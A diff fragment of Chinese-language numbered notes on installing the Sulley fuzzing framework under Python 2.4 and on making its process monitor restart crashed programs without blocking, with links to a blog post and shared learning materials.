-<span class="p">127.</span>安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其他版本,需要人工将python2.4加入到环境变量中,再去sulley framework的安装目录下中的install_files中将ctypes和pcapy用管理员身份安装
-<span class="p">128.</span>sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成os.startfile或subprocess中的popen
-    os.startfile(相当于双击操作,eg. os.startfile("1.txt")):   http://blog.sina.com.cn/s/blog_4b5039210100froh.html
+<span class="p">127.</span>安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其
+    他版本,需要人工将python2.4加入到环境变量中,再去sulley framework的安装目录下中的install_files中将ctypes和
+	pcapy用管理员身份安装
+<span class="p">128.</span>sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成
+	os.startfile或subprocess中的popen os.startfile(相当于双击操作,eg. os.startfile("1.txt")):
+		http://blog.sina.com.cn/s/blog_4b5039210100froh.html
 <span class="p">129.</span>my_sulley学习资料
     http://pan.baidu.com/s/1c1Y6kVY
 <span class="p">130.</span>linux中批量替换目录文件中的字符串:
